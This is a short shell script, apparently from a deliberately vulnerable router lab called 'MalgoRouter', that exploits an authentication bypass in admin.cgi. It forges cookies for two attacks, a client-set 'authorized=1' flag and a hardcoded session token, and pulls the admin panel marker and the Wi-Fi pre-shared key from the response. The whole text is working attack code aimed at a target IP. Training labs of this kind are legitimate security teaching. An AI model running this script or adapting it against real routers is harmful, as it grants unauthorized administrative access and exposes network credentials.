#!/bin/sh
# M6 - admin.cgi client-controlled authentication bypass.
# Default/low: authorized=1 ; medium: hardcoded session=letmein_admin_2024.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
echo "[*] bypass via authorized=1 (high tier)"
curl -s --max-time 15 -H 'Cookie: authorized=1; difficulty=high' \
     "http://$TARGET/cgi-bin/admin.cgi" | grep -Eo 'ADMIN_PANEL|wifi_psk=[^ <"]*' | head
echo "[*] bypass via hardcoded session (medium tier)"
curl -s --max-time 15 -H 'Cookie: session=letmein_admin_2024; difficulty=medium' \
     "http://$TARGET/cgi-bin/admin.cgi" | grep -Eo 'ADMIN_PANEL|wifi_psk=[^ <"]*' | head
